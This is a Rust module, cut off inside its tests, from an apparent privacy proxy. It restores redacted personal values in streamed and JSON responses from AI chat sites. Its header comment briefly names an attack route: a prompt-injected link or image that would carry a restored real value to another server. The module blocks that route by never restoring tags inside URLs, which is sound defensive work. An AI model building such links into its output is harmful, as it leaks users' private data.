//! Restoring real values in the answers of intercepted AI sites.
//!
//! - `text/event-stream`: events parsed incrementally; each JSON string leaf
//!   is restored by a stream restorer keyed by its JSON path (array indices
//!   included, plus the event name and a top-level `index`), or by the patch
//!   path `p` of chatgpt.com-style delta encoding (`{"p","o","v"}` events,
//!   bare `{"v"}` continuations, `patch` batches), so a tag split across
//!   events restores exactly. Non-JSON data shares one restorer per stream.
//! - `application/x-ndjson`: the same, one line per event.
//! - `application/json`: buffered (up to 16 MiB), every string leaf
//!   restored and the document re-serialised; `)]}'`-prefixed JSON-in-text
//!   (Gemini) line by line; larger documents through the JSON fragment
//!   restorer. A body that is not JSON passes through.
//! - `text/plain`: one stream restorer.
//! - Anything else (HTML included) passes through untouched: AI sites
//!   render answers from JSON and event streams, where values are text.
//!
//! Real values only ever land inside parsed JSON strings (re-serialised),
//! JSON-escaped in streamed JSON fragments, or in plain text; JSON carried
//! inside a string is restored at its own level. Tags inside URLs are never
//! restored ([`crate::urlguard`]): a prompt-injected link or image cannot
//! carry a real value to another server.
//!
//! An event that leaves text held back (a possible tag prefix) is kept,
//! with every event after it, until the text is decided: the next event of
//! the same path carries it on, or, at a stop event or the end of the
//! stream, it is flushed into that held event. No event is invented.

use std::collections::{HashMap, HashSet, VecDeque};

use bytes::Bytes;
use parda_engine::{Engine, StreamRestorer};
use parda_wire::JsonFragRestorer;
use parda_wire::jsonfrag::ValueRestorer;
use parda_wire::sse::{SseEvent, SseParser, serialize};
use parda_wire::walk::{leaves, preserve_numbers};
use serde_json::Value;

use crate::StreamTransform;
use crate::urlguard::Guarded;

/// JSON bodies up to this size are restored as whole documents.
const MAX_JSON_BUFFER: usize = 16 * 1024 * 1024;
/// Events held back waiting for undecided text, at most (then flushed).
const MAX_HELD_EVENTS: usize = 64;
const MAX_HELD_BYTES: usize = 1024 * 1024;
/// Google's anti-JSON-hijacking prefix.
const XSSI_PREFIX: &[u8] = b")]}'";
/// The restorer key of non-JSON data.
const TEXT_KEY: &str = "\u{0}text";
/// JSON carried inside strings is restored this many levels deep.
const MAX_NESTED_JSON: usize = 4;
/// Keys whose streamed values are fragments of a JSON document.
const JSON_DELTA_KEYS: &[&str] = &["partial_json", "arguments"];

/// A rewriter for one response body of type `content_type`.
pub(crate) fn for_content_type(
    engine: &Engine,
    scope: &str,
    content_type: &str,
) -> Box<dyn StreamTransform> {
    let media = content_type
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    match media.as_str() {
        "text/event-stream" => Box::new(SseRestore {
            parser: SseParser::default(),
            events: Events::new(engine, scope),
        }),
        "application/x-ndjson"
        | "application/ndjson"
        | "application/jsonl"
        | "application/x-jsonlines"
        | "application/stream+json" => Box::new(NdjsonRestore {
            buf: Vec::new(),
            scanned: 0,
            events: Events::new(engine, scope),
        }),
        m if m == "application/json" || m == "text/json" || m.ends_with("+json") => {
            Box::new(JsonRestore {
                engine: engine.clone(),
                scope: scope.to_string(),
                mode: JsonMode::Buffer(Vec::new()),
            })
        }
        "text/plain" => Box::new(TextStream::new(TextRestorer::plain(engine, scope))),
        _ => Box::new(Passthrough),
    }
}

/// Bodies parda does not rewrite (images, binaries, unknown types).
struct Passthrough;

impl StreamTransform for Passthrough {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        Bytes::copy_from_slice(chunk)
    }

    fn finish(&mut self) -> Bytes {
        Bytes::new()
    }

    fn is_passthrough(&self) -> bool {
        true
    }
}

/// Plain text, or JSON text (real values are JSON-escaped); tags inside
/// URLs are left alone either way.
enum TextRestorer {
    Plain(Guarded<StreamRestorer>),
    Json(JsonFragRestorer),
}

impl TextRestorer {
    fn plain(engine: &Engine, scope: &str) -> Self {
        TextRestorer::Plain(Guarded::new(engine.stream_restorer(scope)))
    }

    fn json(engine: &Engine, scope: &str) -> Self {
        let (engine, scope) = (engine.clone(), scope.to_string());
        TextRestorer::Json(JsonFragRestorer::with_values(Box::new(move || {
            Box::new(Guarded::new(engine.stream_restorer(&scope)))
        })))
    }

    fn push(&mut self, text: &str) -> String {
        match self {
            TextRestorer::Plain(r) => r.push(text),
            TextRestorer::Json(r) => r.push(text),
        }
    }

    fn finish(&mut self) -> String {
        match self {
            TextRestorer::Plain(r) => r.finish(),
            TextRestorer::Json(r) => r.finish(),
        }
    }

    fn pending_len(&self) -> usize {
        match self {
            TextRestorer::Plain(r) => r.pending_len(),
            TextRestorer::Json(r) => r.pending_len(),
        }
    }
}

/// A byte stream restored as UTF-8 text. A character split across chunks
/// waits for its rest; at the first invalid byte the stream stops being
/// rewritten and the rest passes through as it came.
struct TextStream {
    restorer: TextRestorer,
    carry: Vec<u8>,
    raw: bool,
}

impl TextStream {
    fn new(restorer: TextRestorer) -> Self {
        TextStream {
            restorer,
            carry: Vec::new(),
            raw: false,
        }
    }

    fn push_bytes(&mut self, chunk: &[u8]) -> Vec<u8> {
        if self.raw {
            return chunk.to_vec();
        }
        self.carry.extend_from_slice(chunk);
        let (valid, invalid) = match std::str::from_utf8(&self.carry) {
            Ok(_) => (self.carry.len(), false),
            Err(e) => (e.valid_up_to(), e.error_len().is_some()),
        };
        let text = String::from_utf8_lossy(&self.carry[..valid]);
        let mut out = self.restorer.push(&text).into_bytes();
        if invalid {
            out.extend_from_slice(self.restorer.finish().as_bytes());
            out.extend_from_slice(&self.carry[valid..]);
            self.carry.clear();
            self.raw = true;
        } else {
            self.carry.drain(..valid);
        }
        out
    }

    fn finish_bytes(&mut self) -> Vec<u8> {
        if self.raw {
            return Vec::new();
        }
        let mut out = self.restorer.finish().into_bytes();
        // An incomplete character at the very end goes out as it came.
        out.append(&mut self.carry);
        out
    }
}

impl StreamTransform for TextStream {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        Bytes::from(self.push_bytes(chunk))
    }

    fn finish(&mut self) -> Bytes {
        Bytes::from(self.finish_bytes())
    }
}

enum JsonMode {
    Buffer(Vec<u8>),
    Stream(TextStream),
    /// `)]}'`-prefixed JSON-in-text: one JSON value per line.
    Lines(JsonLines),
}

/// A JSON document: restored whole when it fits the buffer.
struct JsonRestore {
    engine: Engine,
    scope: String,
    mode: JsonMode,
}

impl StreamTransform for JsonRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        let buf = match &mut self.mode {
            JsonMode::Stream(s) => return Bytes::from(s.push_bytes(chunk)),
            JsonMode::Lines(l) => return Bytes::from(l.push(chunk)),
            JsonMode::Buffer(buf) => {
                buf.extend_from_slice(chunk);
                buf
            }
        };
        if buf.starts_with(XSSI_PREFIX) {
            // JSON inside text, sent in pieces: each line as it completes.
            let held = std::mem::take(buf);
            let mut lines = JsonLines {
                engine: self.engine.clone(),
                scope: self.scope.clone(),
                buf: Vec::new(),
                scanned: 0,
            };
            let out = lines.push(&held);
            self.mode = JsonMode::Lines(lines);
            return Bytes::from(out);
        }
        if buf.len() <= MAX_JSON_BUFFER {
            return Bytes::new();
        }
        let held = std::mem::take(buf);
        let mut stream = TextStream::new(TextRestorer::json(&self.engine, &self.scope));
        let out = stream.push_bytes(&held);
        self.mode = JsonMode::Stream(stream);
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        match &mut self.mode {
            JsonMode::Stream(s) => Bytes::from(s.finish_bytes()),
            JsonMode::Lines(l) => Bytes::from(l.finish()),
            JsonMode::Buffer(buf) => {
                let raw = std::mem::take(buf);
                if raw.starts_with(XSSI_PREFIX) {
                    let mut lines = JsonLines {
                        engine: self.engine.clone(),
                        scope: self.scope.clone(),
                        buf: Vec::new(),
                        scanned: 0,
                    };
                    let mut out = lines.push(&raw);
                    out.extend(lines.finish());
                    return Bytes::from(out);
                }
                Bytes::from(restore_document(&self.engine, &self.scope, raw))
            }
        }
    }
}

/// Restore every string leaf of a JSON document; the exact bytes when
/// nothing changed. A body that is not JSON passes through.
fn restore_document(engine: &Engine, scope: &str, raw: Vec<u8>) -> Vec<u8> {
    let Ok(v) = parda_wire::body::parse_json(&raw) else {
        return raw;
    };
    restore_json_value(engine, scope, &raw, v).unwrap_or(raw)
}

/// Restore the string leaves of `v` (parsed from `raw`); the re-serialised
/// document when a leaf changed.
fn restore_json_value(engine: &Engine, scope: &str, raw: &[u8], mut v: Value) -> Option<Vec<u8>> {
    let mut changed = false;
    leaves(&mut v, &mut |s: &mut String| {
        changed |= restore_string(engine, scope, s, 0);
    });
    changed.then(|| preserve_numbers(raw, serde_json::to_vec(&v).unwrap_or_default()))
}

/// A JSON object or array carried in a string, if `s` is one.
fn json_container(s: &str) -> Option<Value> {
    let t = s.trim();
    let bracketed =
        (t.starts_with('{') && t.ends_with('}')) || (t.starts_with('[') && t.ends_with(']'));
    if !bracketed {
        return None;
    }
    serde_json::from_str::<Value>(t)
        .ok()
        .filter(|v| v.is_object() || v.is_array())
}

/// Restore one whole string value in place. JSON inside it is restored at
/// its own level (so a real value is escaped where it lands); in text, tags
/// inside URLs stay tags. Returns whether it changed.
fn restore_string(engine: &Engine, scope: &str, s: &mut String, depth: usize) -> bool {
    if s.is_empty() {
        return false;
    }
    if depth < MAX_NESTED_JSON
        && let Some(mut inner) = json_container(s)
    {
        let mut changed = false;
        leaves(&mut inner, &mut |t: &mut String| {
            changed |= restore_string(engine, scope, t, depth + 1);
        });
        if changed {
            let out = preserve_numbers(s.as_bytes(), inner.to_string().into_bytes());
            *s = String::from_utf8(out)
                .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned());
        }
        return changed;
    }
    let mut r = Guarded::new(engine.stream_restorer(scope));
    let mut out = r.push(s);
    out.push_str(&r.finish());
    if out == *s {
        return false;
    }
    *s = out;
    true
}

/// JSON-in-text, one JSON value per line (each a snapshot, restored whole);
/// lines that are not JSON pass through.
struct JsonLines {
    engine: Engine,
    scope: String,
    buf: Vec<u8>,
    /// Bytes of `buf` known to hold no newline.
    scanned: usize,
}

impl JsonLines {
    fn push(&mut self, chunk: &[u8]) -> Vec<u8> {
        self.buf.extend_from_slice(chunk);
        let mut out = Vec::new();
        while let Some(i) = self.buf[self.scanned..].iter().position(|&b| b == b'\n') {
            let line: Vec<u8> = self.buf.drain(..self.scanned + i + 1).collect();
            self.scanned = 0;
            out.extend(self.line(&line));
        }
        self.scanned = self.buf.len();
        out
    }

    fn finish(&mut self) -> Vec<u8> {
        self.scanned = 0;
        let rest = std::mem::take(&mut self.buf);
        self.line(&rest)
    }

    fn line(&self, line: &[u8]) -> Vec<u8> {
        let body_len = line.len() - usize::from(line.ends_with(b"\n"));
        let body = &line[..body_len];
        let restored = serde_json::from_slice::<Value>(body)
            .ok()
            .and_then(|v| restore_json_value(&self.engine, &self.scope, body, v));
        match restored {
            Some(mut new) => {
                new.extend_from_slice(&line[body_len..]);
                new
            }
            None => line.to_vec(),
        }
    }
}

/// A server-sent-event stream.
struct SseRestore {
    parser: SseParser,
    events: Events,
}

impl StreamTransform for SseRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        let mut out = Vec::new();
        for ev in self.parser.feed(chunk) {
            render_all(self.events.on_item(Item::sse(ev)), &mut out);
        }
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        let mut out = Vec::new();
        if let Some(ev) = self.parser.finish() {
            render_all(self.events.on_item(Item::sse(ev)), &mut out);
        }
        render_all(self.events.finish(), &mut out);
        Bytes::from(out)
    }
}

/// Newline-delimited JSON: one item per line.
struct NdjsonRestore {
    buf: Vec<u8>,
    /// Bytes of `buf` known to hold no newline.
    scanned: usize,
    events: Events,
}

impl StreamTransform for NdjsonRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        self.buf.extend_from_slice(chunk);
        let mut out = Vec::new();
        while let Some(i) = self.buf[self.scanned..].iter().position(|&b| b == b'\n') {
            let line: Vec<u8> = self.buf.drain(..self.scanned + i + 1).collect();
            self.scanned = 0;
            render_all(self.events.on_item(Item::line(line)), &mut out);
        }
        self.scanned = self.buf.len();
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        let mut out = Vec::new();
        if !self.buf.is_empty() {
            let line = std::mem::take(&mut self.buf);
            render_all(self.events.on_item(Item::line(line)), &mut out);
        }
        self.scanned = 0;
        render_all(self.events.finish(), &mut out);
        Bytes::from(out)
    }
}

fn render_all(items: Vec<Item>, out: &mut Vec<u8>) {
    for item in items {
        out.extend_from_slice(&item.render());
    }
}

/// One step of a path inside a JSON value.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Seg {
    Key(String),
    Index(usize),
}

/// Where a restorer key's latest text sits in an item.
#[derive(Debug, Clone)]
enum Leaf {
    Json(Vec<Seg>),
    Data,
}

/// One SSE event or NDJSON line.
struct Item {
    /// Exactly what arrived: unchanged items go out as they came.
    raw: Bytes,
    sse: Option<SseEvent>,
    /// The NDJSON line ending (`\n`, `\r\n` or none).
    ending: &'static str,
    /// The SSE data or the NDJSON line.
    data: String,
    json: Option<Value>,
    /// Restored non-JSON data.
    text: Option<String>,
    changed: bool,
}

impl Item {
    fn sse(ev: SseEvent) -> Self {
        let raw = ev.raw.clone().unwrap_or_else(|| serialize(&ev));
        Item {
            raw,
            data: ev.data.clone(),
            sse: Some(ev),
            ending: "",
            json: None,
            text: None,
            changed: false,
        }
    }

    fn line(bytes: Vec<u8>) -> Self {
        let (body, ending) = if bytes.ends_with(b"\r\n") {
            (&bytes[..bytes.len() - 2], "\r\n")
        } else if bytes.ends_with(b"\n") {
            (&bytes[..bytes.len() - 1], "\n")
        } else {
            (&bytes[..], "")
        };
        Item {
            data: String::from_utf8_lossy(body).into_owned(),
            raw: Bytes::from(bytes),
            sse: None,
            ending,
            json: None,
            text: None,
            changed: false,
        }
    }

    /// The SSE `event:` name, `""` for NDJSON.
    fn name(&self) -> &str {
        match &self.sse {
            Some(ev) => ev.event.as_deref().unwrap_or("message"),
            None => "",
        }
    }

    fn render(self) -> Bytes {
        if !self.changed {
            return self.raw;
        }
        let data = match (&self.json, self.text) {
            (Some(v), _) => {
                let json = serde_json::to_vec(v).unwrap_or_default();
                let json = preserve_numbers(self.data.as_bytes(), json);
                String::from_utf8(json)
                    .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
            }
            (None, Some(t)) => t,
            (None, None) => self.data,
        };
        match self.sse {
            Some(mut ev) => {
                ev.set_data(data);
                serialize(&ev)
            }
            None => Bytes::from(data + self.ending),
        }
    }
}

/// Add flushed text at `leaf` of an item's (taken-out) JSON or data.
fn append_at(
    json: Option<&mut Value>,
    text: &mut Option<String>,
    data: &str,
    leaf: &Leaf,
    tail: &str,
) {
    match leaf {
        Leaf::Data => text.get_or_insert_with(|| data.to_string()).push_str(tail),
        Leaf::Json(path) => {
            if let Some(Value::String(s)) = json.and_then(|v| pointer_mut(v, path)) {
                s.push_str(tail);
            }
        }
    }
}

fn pointer_mut<'a>(v: &'a mut Value, path: &[Seg]) -> Option<&'a mut Value> {
    let mut cur = v;
    for seg in path {
        cur = match seg {
            Seg::Key(k) => cur.get_mut(k.as_str())?,
            Seg::Index(i) => cur.get_mut(*i)?,
        };
    }
    Some(cur)
}

/// The paths of every string leaf of `v`, in document order.
fn leaf_paths(v: &Value, path: &mut Vec<Seg>, out: &mut Vec<Vec<Seg>>) {
    match v {
        Value::String(_) => out.push(path.clone()),
        Value::Array(items) => {
            for (i, x) in items.iter().enumerate() {
                path.push(Seg::Index(i));
                leaf_paths(x, path, out);
                path.pop();
            }
        }
        Value::Object(map) => {
            for (k, x) in map {
                path.push(Seg::Key(k.clone()));
                leaf_paths(x, path, out);
                path.pop();
            }
        }
        _ => {}
    }
}

fn render_path(path: &[Seg]) -> String {
    path.iter()
        .map(|s| match s {
            Seg::Key(k) => k.clone(),
            Seg::Index(i) => i.to_string(),
        })
        .collect::<Vec<_>>()
        .join("/")
}

/// How a key's successive values relate.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// Known deltas (chatgpt.com appends, Claude text deltas).
    Delta,
    /// Known deltas of JSON text (tool-call `partial_json`).
    JsonDelta,
    /// Unknown: a value that extends the previous one is a snapshot of the
    /// whole text so far, anything else a delta.
    Auto,
}

/// One restorer key: a JSON path or a patch path.
struct Track {
    restorer: TextRestorer,
    kind: Kind,
    /// [`Kind::Auto`]: the previous value as it came, and as it went out.
    prev_raw: String,
    prev_out: String,
    /// The last raw text pushed (what the restorer may be holding back is a
    /// suffix of it).
    recent: String,
    /// The item (sequence number) and leaf that hold this key's latest text.
    last: Option<(u64, Leaf)>,
}

/// Keep the last `max` bytes of `s` (at a character boundary).
fn keep_tail(s: &mut String, max: usize) {
    if s.len() > max {
        let mut cut = s.len() - max;
        while !s.is_char_boundary(cut) {
            cut += 1;
        }
        s.drain(..cut);
    }
}

/// Is what `track`'s restorer holds back a whole surrogate on its own (not
/// the start of one still being streamed)?
fn held_tag_is_complete(engine: &Engine, scope: &str, track: &Track) -> bool {
    let held = track.restorer.pending_len();
    if held == 0 || held > track.recent.len() {
        return false;
    }
    let mut start = track.recent.len() - held;
    while !track.recent.is_char_boundary(start) {
        start += 1;
    }
    let tail = &track.recent[start..];
    engine.restore(tail, scope) != tail
}

/// The per-stream state shared by SSE and NDJSON.
struct Events {
    engine: Engine,
    scope: String,
    tracks: HashMap<String, Track>,
    /// Keys holding text back.
    pending: HashSet<String>,
    /// Items held back, oldest first; the first has sequence `first_seq`.
    queue: VecDeque<Item>,
    first_seq: u64,
    queued_bytes: usize,
    /// Text flushed into the item being processed (applied after it).
    current: Vec<(Leaf, String)>,
    /// chatgpt.com delta encoding: the last patch path and operation.
    last_p: String,
    last_o: Option<String>,
}

fn is_patch_event(v: &Value) -> bool {
    v.as_object().is_some_and(|m| {
        m.contains_key("v")
            && m.keys()
                .all(|k| matches!(k.as_str(), "p" | "o" | "v" | "c"))
    })
}

/// Normalised patch path: no leading `/`.
fn norm(p: &str) -> String {
    p.trim_start_matches('/').to_string()
}

fn patch_key(p: &str) -> String {
    format!("\u{1}{p}")
}

fn join_key(key: &str, rel: &str) -> String {
    if rel.is_empty() {
        key.to_string()
    } else if key == "\u{1}" {
        format!("{key}{rel}")
    } else {
        format!("{key}/{rel}")
    }
}

fn is_stop(item: &Item, json: Option<&Value>) -> bool {
    item.data == "[DONE]"
        || matches!(item.name(), "done" | "message_stop" | "content_block_stop")
        || json
            .and_then(|v| v.get("type"))
            .and_then(Value::as_str)
            .is_some_and(|t| {
                matches!(
                    t,
                    "message_stop" | "content_block_stop" | "message_stream_complete" | "done"
                )
            })
}

impl Events {
    fn new(engine: &Engine, scope: &str) -> Self {
        Events {
            engine: engine.clone(),
            scope: scope.to_string(),
            tracks: HashMap::new(),
            pending: HashSet::new(),
            queue: VecDeque::new(),
            first_seq: 0,
            queued_bytes: 0,
            current: Vec::new(),
            last_p: String::new(),
            last_o: None,
        }
    }

    /// Restore one item; returns the items ready to go out, in order.
    fn on_item(&mut self, mut item: Item) -> Vec<Item> {
        let seq = self.first_seq + self.queue.len() as u64;
        let first = item.data.trim_start().chars().next();
        let mut json = if matches!(first, Some('{' | '[' | '"')) {
            serde_json::from_str::<Value>(&item.data).ok()
        } else {
            None
        };
        if is_stop(&item, json.as_ref()) {
            self.flush_all(seq);
        }
        let mut changed = false;
        match json.as_mut() {
            Some(v) => changed = self.restore_json(seq, item.name().to_string(), v),
            None if item.sse.is_some() && !item.data.is_empty() && item.data != "[DONE]" => {
                let mut data = item.data.clone();
                changed = self.push(TEXT_KEY, seq, Leaf::Data, &mut data, Kind::Delta);
                item.text = Some(data);
            }
            None => {}
        }
        for (leaf, tail) in std::mem::take(&mut self.current) {
            append_at(json.as_mut(), &mut item.text, &item.data, &leaf, &tail);
            changed = true;
        }
        item.json = json;
        item.changed |= changed;
        self.queued_bytes += item.data.len();
        self.queue.push_back(item);
        if !self.pending.is_empty()
            && self.queue.len() < MAX_HELD_EVENTS
            && self.queued_bytes < MAX_HELD_BYTES
        {
            return Vec::new();
        }
        self.flush_all(u64::MAX);
        self.drain()
    }

    /// The end of the stream: flush everything held back.
    fn finish(&mut self) -> Vec<Item> {
        self.flush_all(u64::MAX);
        self.drain()
    }

    fn drain(&mut self) -> Vec<Item> {
        self.first_seq += self.queue.len() as u64;
        self.queued_bytes = 0;
        self.queue.drain(..).collect()
    }

    /// Restore the string leaves of one JSON item.
    fn restore_json(&mut self, seq: u64, name: String, v: &mut Value) -> bool {
        if is_patch_event(v) {
            return self.patch_event(seq, v);
        }
        let index = v.get("index").map(Value::to_string).unwrap_or_default();
        let delta = matches!(
            v.get("type").and_then(Value::as_str),
            Some("content_block_delta" | "completion")
        );
        let prefix = format!("{name}|{index}|");
        let mut paths = Vec::new();
        leaf_paths(v, &mut Vec::new(), &mut paths);
        let mut changed = false;
        for path in paths {
            let kind = match path.last() {
                Some(Seg::Key(k)) if JSON_DELTA_KEYS.contains(&k.as_str()) => Kind::JsonDelta,
                _ if delta => Kind::Delta,
                _ => Kind::Auto,
            };
            let key = format!("{prefix}{}", render_path(&path));
            if let Some(Value::String(s)) = pointer_mut(v, &path) {
                changed |= self.push(&key, seq, Leaf::Json(path), s, kind);
            }
        }
        changed
    }

    /// chatgpt.com delta encoding: `{"p": path, "o": op, "v": value}`,
    /// `{"v": …}` continuing the last path and op, and `patch` batches.
    fn patch_event(&mut self, seq: u64, v: &mut Value) -> bool {
        let Some(obj) = v.as_object_mut() else {
            return false;
        };
        let p = obj.get("p").and_then(Value::as_str).map(norm);
        let o = obj
            .get("o")
            .and_then(Value::as_str)
            .map(str::to_ascii_lowercase);
        if let Some(p) = &p {
            self.last_p = p.clone();
        }
        if let Some(o) = &o {
            self.last_o = Some(o.clone());
        }
        let Some(val) = obj.get_mut("v") else {
            return false;
        };
        let op = o
            .or_else(|| self.last_o.clone())
            .unwrap_or_else(|| if val.is_string() { "append" } else { "add" }.to_string());
        let path = self.last_p.clone();
        if op == "patch"
            && let Value::Array(ops) = val
        {
            let mut changed = false;
            for (i, item) in ops.iter_mut().enumerate() {
                let Some(m) = item.as_object_mut() else {
                    continue;
                };
                let op_p = m
                    .get("p")
                    .and_then(Value::as_str)
                    .map(norm)
                    .unwrap_or_default();
                let op_o = m
                    .get("o")
                    .and_then(Value::as_str)
                    .map_or_else(|| "append".to_string(), str::to_ascii_lowercase);
                if let Some(op_v) = m.get_mut("v") {
                    let base = vec![Seg::Key("v".into()), Seg::Index(i), Seg::Key("v".into())];
                    changed |= self.apply_op(seq, base, &op_p, &op_o, op_v);
                }
            }
            return changed;
        }
        self.apply_op(seq, vec![Seg::Key("v".into())], &path, &op, val)
    }

    fn apply_op(&mut self, seq: u64, base: Vec<Seg>, p: &str, op: &str, v: &mut Value) -> bool {
        let key = patch_key(p);
        let append = op == "append";
        if !append {
            // A new value replaces the old one (and everything under it).
            self.reset(&key, seq);
        }
        match v {
            Value::String(s) => self.push(&key, seq, Leaf::Json(base), s, Kind::Delta),
            Value::Object(_) | Value::Array(_) => {
                let mut paths = Vec::new();
                leaf_paths(v, &mut Vec::new(), &mut paths);
                let mut changed = false;
                for rel in paths {
                    let k = join_key(&key, &render_path(&rel));
                    let mut full = base.clone();
                    full.extend(rel.iter().cloned());
                    if let Some(Value::String(s)) = pointer_mut(v, &rel) {
                        changed |= self.push(&k, seq, Leaf::Json(full), s, Kind::Delta);
                    }
                }
                changed
            }
            _ => false,
        }
    }

    /// Flush and forget `key` and every key under it.
    fn reset(&mut self, key: &str, seq: u64) {
        let under = format!("{key}/");
        let keys: Vec<String> = self
            .tracks
            .keys()
            .filter(|k| {
                if key == "\u{1}" {
                    k.starts_with(key)
                } else {
                    *k == key || k.starts_with(&under)
                }
            })
            .cloned()
            .collect();
        for k in keys {
            self.flush_key(&k, seq);
            self.tracks.remove(&k);
        }
    }

    /// Restore `s` (the value of `key` in item `seq`, at `leaf`) in place.
    fn push(&mut self, key: &str, seq: u64, leaf: Leaf, s: &mut String, kind: Kind) -> bool {
        let Events {
            engine,
            scope,
            tracks,
            ..
        } = self;
        let track = tracks.entry(key.to_string()).or_insert_with(|| Track {
            restorer: if kind == Kind::JsonDelta {
                TextRestorer::json(engine, scope)
            } else {
                TextRestorer::plain(engine, scope)
            },
            kind,
            prev_raw: String::new(),
            prev_out: String::new(),
            recent: String::new(),
            last: None,
        });
        if track.kind == Kind::Auto && json_container(s).is_some() {
            // A JSON document in a string, sent whole: restored at its own
            // level, never spliced into as text.
            return restore_string(engine, scope, s, 0);
        }
        let snapshot = track.kind == Kind::Auto
            && !track.prev_raw.is_empty()
            && s.starts_with(&track.prev_raw);
        if track.kind == Kind::Auto && !snapshot && held_tag_is_complete(engine, scope, track) {
            // A new value that does not extend the last one, while a whole
            // tag is held back: the last value was complete (a title, a
            // status line), so the tag goes back into it, not into this one.
            self.flush_key(key, seq);
            return self.push(key, seq, leaf, s, kind);
        }
        let track = self.tracks.get_mut(key).expect("inserted above");
        let raw = std::mem::take(s);
        track.recent.push_str(if snapshot {
            &raw[track.prev_raw.len()..]
        } else {
            &raw
        });
        keep_tail(&mut track.recent, 256);
        let out = if snapshot {
            let added = track.restorer.push(&raw[track.prev_raw.len()..]);
            let mut out = track.prev_out.clone();
            out.push_str(&added);
            out
        } else {
            track.restorer.push(&raw)
        };
        if track.kind == Kind::Auto {
            track.prev_raw.clone_from(&raw);
            track.prev_out.clone_from(&out);
        }
        track.last = Some((seq, leaf));
        if track.restorer.pending_len() > 0 {
            self.pending.insert(key.to_string());
        } else {
            self.pending.remove(key);
        }
        let changed = out != raw;
        *s = out;
        changed
    }

    /// Flush what `key` holds back into the item that holds its latest text.
    /// (Also clears what the restorer was holding.)
    /// `current` is the sequence number of the item being processed.
    fn flush_key(&mut self, key: &str, current: u64) {
        self.pending.remove(key);
        let Some(track) = self.tracks.get_mut(key) else {
            return;
        };
        let tail = track.restorer.finish();
        if tail.is_empty() {
            return;
        }
        if track.kind == Kind::Auto {
            track.prev_out.push_str(&tail);
        }
        let Some((seq, leaf)) = track.last.clone() else {
            return;
        };
        if seq == current {
            self.current.push((leaf, tail));
        } else if let Some(item) = seq
            .checked_sub(self.first_seq)
            .and_then(|i| self.queue.get_mut(i as usize))
        {
            append_at(item.json.as_mut(), &mut item.text, &item.data, &leaf, &tail);
            item.changed = true;
        } else {
            tracing::warn!("intercept: held-back text had no event to go into");
        }
    }

    fn flush_all(&mut self, current: u64) {
        let keys: Vec<String> = self.pending.iter().cloned().collect();
        for k in keys {
            self.flush_key(&k, current);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine_transform::tests::{QUOTED, engine};
    use parda_wire::sse::{SseEvent, SseParser};
    use proptest::prelude::*;
    use serde_json::{Value, json};

    const SCOPE: &str = "global";

    /// An engine with `[NAME_1]` = Ravi Kumar and `[EMAIL_1]` =
    /// ravi@example.com in the global scope.
    fn tagged(dir: &std::path::Path) -> Engine {
        let e = engine(dir);
        let r = e
            .redact("Ravi Kumar wrote to ravi@example.com", SCOPE)
            .unwrap();
        assert_eq!(r.text, "[NAME_1] wrote to [EMAIL_1]");
        e
    }

    /// Run `body` through a rewriter for `ct`, in chunks of `n` bytes.
    fn run(e: &Engine, ct: &str, body: &[u8], n: usize) -> Vec<u8> {
        let mut t = for_content_type(e, SCOPE, ct);
        let mut out = Vec::new();
        for c in body.chunks(n.max(1)) {
            out.extend_from_slice(&t.push(c));
        }
        out.extend_from_slice(&t.finish());
        out
    }

    fn events(body: &[u8]) -> Vec<SseEvent> {
        let mut p = SseParser::default();
        let mut evs = p.feed(body);
        evs.extend(p.finish());
        evs
    }

    fn sse(evs: &[(Option<&str>, String)]) -> Vec<u8> {
        let mut out = String::new();
        for (name, data) in evs {
            if let Some(n) = name {
                out.push_str(&format!("event: {n}\n"));
            }
            out.push_str(&format!("data: {data}\n\n"));
        }
        out.into_bytes()
    }

    /// The text a chatgpt.com client builds from a delta-encoded stream:
    /// appends to `/message/content/parts/0`, via explicit `p`, bare `{"v"}`
    /// continuations and `patch` batches.
    fn chatgpt_text(out: &[u8]) -> String {
        const PART: &str = "/message/content/parts/0";
        let mut text = String::new();
        let mut last_p = String::new();
        let mut last_o = String::new();
        let apply = |p: &str, o: &str, v: &Value, text: &mut String| match (o, v) {
            ("append", Value::String(s)) if p == PART => text.push_str(s),
            ("add", Value::Object(_)) if p.is_empty() => {
                if let Some(s) = v["message"]["content"]["parts"][0].as_str() {
                    *text = s.to_string();
                }
            }
            _ => {}
        };
        for ev in events(out) {
            let Ok(v) = serde_json::from_str::<Value>(&ev.data) else {
                continue;
            };
            if ev.event.as_deref() != Some("delta") {
                continue;
            }
            if let Some(p) = v.get("p").and_then(Value::as_str) {
                last_p = p.to_string();
            }
            if let Some(o) = v.get("o").and_then(Value::as_str) {
                last_o = o.to_string();
            }
            if last_o == "patch" {
                for op in v["v"].as_array().into_iter().flatten() {
                    apply(
                        op["p"].as_str().unwrap_or(""),
                        op["o"].as_str().unwrap_or(""),
                        &op["v"],
                        &mut text,
                    );
                }
            } else {
                apply(&last_p, &last_o, &v["v"], &mut text);
            }
        }
        text
    }

    /// A chatgpt.com delta-encoded answer whose text is `pieces` joined.
    fn chatgpt_stream(pieces: &[&str]) -> Vec<u8> {
        let mut evs = vec![
            (Some("delta_encoding"), "\"v1\"".to_string()),
            (
                Some("delta"),
                json!({"p": "", "o": "add", "v": {"message": {
                    "id": "m1", "author": {"role": "assistant"},
                    "content": {"content_type": "text", "parts": [""]},
                    "status": "in_progress"}, "conversation_id": "c1"}, "c": 0})
                .to_string(),
            ),
        ];
        for (i, piece) in pieces.iter().enumerate() {
            let data = match i % 3 {
                0 => json!({"p": "/message/content/parts/0", "o": "append", "v": piece}),
                1 => json!({"v": piece}),
                _ => json!({"p": "", "o": "patch", "v": [
                    {"p": "/message/content/parts/0", "o": "append", "v": piece},
